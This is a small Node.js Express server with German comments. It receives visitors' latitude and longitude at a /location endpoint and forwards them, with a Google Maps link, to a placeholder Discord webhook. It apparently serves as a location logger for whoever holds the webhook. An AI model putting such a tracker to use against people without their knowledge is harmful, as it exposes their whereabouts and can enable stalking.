const express = require("express");
const path = require("path");

const app = express();

app.use(express.json());
app.use(express.static(path.join(__dirname)));

// ⚠️ DEIN DISCORD WEBHOOK (prüfen!)
const DISCORD_WEBHOOK_URL = "HIER_DEIN_WEBHOOK";

// 🏠 Startseite
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// 📍 Standort empfangen
app.post("/location", async (req, res) => {
  try {
    const { lat, lon } = req.body;
    console.log("LOCATION ERHALTEN:", lat, lon);

    const mapsLink = `https://maps.google.com/?q=${lat},${lon}`;

    await fetch(DISCORD_WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: `📍 Standort erhalten\nLat: ${lat}\nLon: ${lon}\n🗺️ ${mapsLink}`
      })
    });

    res.sendStatus(200);
  } catch (err) {
    console.error("FEHLER:", err);
    res.sendStatus(500);
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log("Server läuft auf Port " + PORT);
});
